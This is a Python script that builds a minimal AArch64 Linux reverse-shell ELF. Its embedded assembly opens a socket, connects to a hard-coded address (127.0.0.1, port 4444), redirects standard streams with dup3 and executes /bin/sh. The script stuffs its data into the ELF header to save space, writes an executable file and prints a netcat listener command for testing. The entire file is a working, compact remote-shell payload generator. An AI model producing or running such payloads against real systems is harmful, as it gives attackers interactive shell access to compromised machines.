#!/usr/bin/env python3
"""
Downsized AArch64 Reverse Shell ELF (~220 bytes).
Data in ELF header, loop for dup3, no wasted branch preamble.
"""

import struct
import subprocess
import os
import tempfile

BASE = 0x10000
TOTAL_HEADER_SIZE = 120
SOCKADDR_VAL = 0x0100007f5c110002
BINSH_BYTES = b'/bin/sh\x00'


def adr_decode(inst):
    rd = inst & 0x1f
    immlo = (inst >> 29) & 3
    immhi = (inst >> 5) & 0x7ffff
    imm21 = (immhi << 2) | immlo
    if imm21 & 0x100000:
        imm21 |= ~0x1fffff
    return rd, imm21


def adr_encode(rd, imm21):
    imm21 = imm21 & 0x1fffff
    immlo = imm21 & 3
    immhi = (imm21 >> 2) & 0x7ffff
    return 0x10000000 | (immlo << 29) | (immhi << 5) | rd


def make_asm():
    """
    Assembly with data AFTER code — no branch preamble needed.
    dup3 uses a loop saving 8 bytes. execve reuses x2=0 from loop.
    """
    return '''
    .arch armv8-a
    .text
    .global _start
_start:
    /* socket(AF_INET=2, SOCK_STREAM=1, 0) */
    mov x0, #2
    mov x1, #1
    mov x8, #198
    svc #0
    mov x5, x0

    /* connect(sockfd, &sa, 16) */
    adr x0, sockaddr_data
    ldr x0, [x0]
    stp x0, xzr, [sp, #-16]!
    mov x0, x5
    mov x1, sp
    mov x2, #16
    mov x8, #203
    svc #0

    /* dup3 loop: 3→stderr, 2→stdout, 1→stdin */
    mov x1, #3
dup_loop:
    mov x2, xzr
    mov w0, w5
    subs x1, x1, #1
    mov x8, #24
    svc #0
    b.ne dup_loop

    /* execve("/bin/sh", [binsh, NULL], NULL) */
    /* x2 is 0 from dup_loop — saves mov x2, xzr */
    adr x0, binsh_data
    stp x0, xzr, [sp, #-16]!
    mov x1, sp
    mov x8, #221
    svc #0

sockaddr_data:
    .quad 0x0100007f5c110002
binsh_data:
    .asciz "/bin/sh"
'''


def build_elf(raw_code):
    SOCKADDR_BYTES = struct.pack('<Q', SOCKADDR_VAL)
    sockaddr_off = raw_code.find(SOCKADDR_BYTES)
    binsh_off = raw_code.find(BINSH_BYTES)

    print(f"  sockaddr at raw offset {sockaddr_off:#x}")
    print(f"  binsh at raw offset {binsh_off:#x}")

    # Data is at the END of raw_code
    data_start = min(sockaddr_off, binsh_off)
    # Real code is everything before data
    real_code = raw_code[:data_start]

    print(f"  Code size: {len(real_code)} bytes, data at end")

    code = bytearray(real_code)

    # Patch ADR instructions
    for i in range(0, len(code) - 4, 4):
        inst = struct.unpack('<I', code[i:i+4])[0]
        if (inst >> 24) == 0x10 and ((inst >> 28) & 1):
            rd, old_imm21 = adr_decode(inst)
            old_target = i + old_imm21

            new_target = None
            name = None
            if old_target == sockaddr_off:
                new_target = 0x08
                name = "sockaddr"
            elif old_target == binsh_off:
                new_target = 0x28
                name = "binsh"

            if new_target is not None:
                new_imm21 = new_target - TOTAL_HEADER_SIZE - i
                print(f"  ADR X{rd} at [{i:#x}]: {name} → header+{new_target:#x} ({new_imm21:#x})")
                if new_imm21 < -0x100000 or new_imm21 > 0xfffff:
                    print(f"    ERROR: out of range!")
                    continue
                new_inst = adr_encode(rd, new_imm21)
                code[i:i+4] = struct.pack('<I', new_inst)
                print(f"    {inst:#010x} → {new_inst:#010x}")

    total_size = TOTAL_HEADER_SIZE + len(code)

    # ELF Header
    ehdr = bytearray(64)
    ehdr[0:4] = b'\x7fELF'
    ehdr[4] = 2
    ehdr[5] = 1
    ehdr[6] = 1
    ehdr[7] = 0
    struct.pack_into('<Q', ehdr, 8, SOCKADDR_VAL)
    struct.pack_into('<H', ehdr, 0x10, 2)
    struct.pack_into('<H', ehdr, 0x12, 0xb7)
    struct.pack_into('<I', ehdr, 0x14, 1)
    struct.pack_into('<Q', ehdr, 0x18, BASE + TOTAL_HEADER_SIZE)
    struct.pack_into('<Q', ehdr, 0x20, 64)
    struct.pack_into('<Q', ehdr, 0x28, int.from_bytes(BINSH_BYTES, 'little'))
    struct.pack_into('<I', ehdr, 0x30, 0)
    struct.pack_into('<H', ehdr, 0x34, 64)
    struct.pack_into('<H', ehdr, 0x36, 56)
    struct.pack_into('<H', ehdr, 0x38, 1)
    struct.pack_into('<H', ehdr, 0x3a, 0)
    struct.pack_into('<H', ehdr, 0x3c, 0)
    struct.pack_into('<H', ehdr, 0x3e, 0)

    # Program Header
    phdr = bytearray(56)
    struct.pack_into('<I', phdr, 0, 1)
    struct.pack_into('<I', phdr, 4, 7)
    struct.pack_into('<Q', phdr, 8, 0)
    struct.pack_into('<Q', phdr, 0x10, BASE)
    struct.pack_into('<Q', phdr, 0x18, 0)
    struct.pack_into('<Q', phdr, 0x20, total_size)
    struct.pack_into('<Q', phdr, 0x28, total_size)
    struct.pack_into('<Q', phdr, 0x30, 1)

    return bytes(ehdr) + bytes(phdr) + bytes(code)


def main():
    print("=== Downsized AArch64 Reverse Shell ===\n")

    asm = make_asm()
    with tempfile.TemporaryDirectory() as tmpdir:
        asm_file = os.path.join(tmpdir, 'rev.S')
        obj_file = os.path.join(tmpdir, 'rev.o')
        elf_file = os.path.join(tmpdir, 'rev.elf')
        raw_file = os.path.join(tmpdir, 'rev.bin')

        with open(asm_file, 'w') as f:
            f.write(asm)

        print("Assembling...")
        subprocess.run(['aarch64-linux-gnu-as', '-o', obj_file, asm_file],
                       check=True, capture_output=True)
        print("Linking...")
        subprocess.run([
            'aarch64-linux-gnu-ld', '-N', '--omagic', '-s',
            '-Ttext=0', '-o', elf_file, obj_file
        ], check=True, capture_output=True)
        print("Extracting raw binary...")
        subprocess.run([
            'aarch64-linux-gnu-objcopy', '--strip-section-headers',
            '-O', 'binary', elf_file, raw_file
        ], check=True, capture_output=True)

        with open(raw_file, 'rb') as f:
            raw_code = f.read()

        print(f"\nRaw code size: {len(raw_code)} bytes")
        print("\nDisassembly:")
        subprocess.run(['aarch64-linux-gnu-objdump', '-d', elf_file])
        print()

    print("Building final ELF...")
    elf_binary = build_elf(raw_code)

    output = 'rev_minimal'
    with open(output, 'wb') as f:
        f.write(elf_binary)
    os.chmod(output, 0o755)

    print(f"\n=== RESULT ===")
    print(f"Output: {output}")
    print(f"Size: {len(elf_binary)} bytes")

    print(f"\nHex dump:")
    for i in range(0, len(elf_binary), 16):
        hexb = ' '.join(f'{b:02x}' for b in elf_binary[i:i+16])
        asc = ''.join(chr(b) if 32 <= b < 127 else '.' for b in elf_binary[i:i+16])
        print(f"{i:04x}: {hexb:<48s} {asc}")

    try:
        print("\nreadelf -h:")
        subprocess.run(['readelf', '-h', output])
    except FileNotFoundError:
        pass

    print(f"\nqemu-aarch64 ./{output}  +  nc -lvnp 4444")


if __name__ == '__main__':
    main()
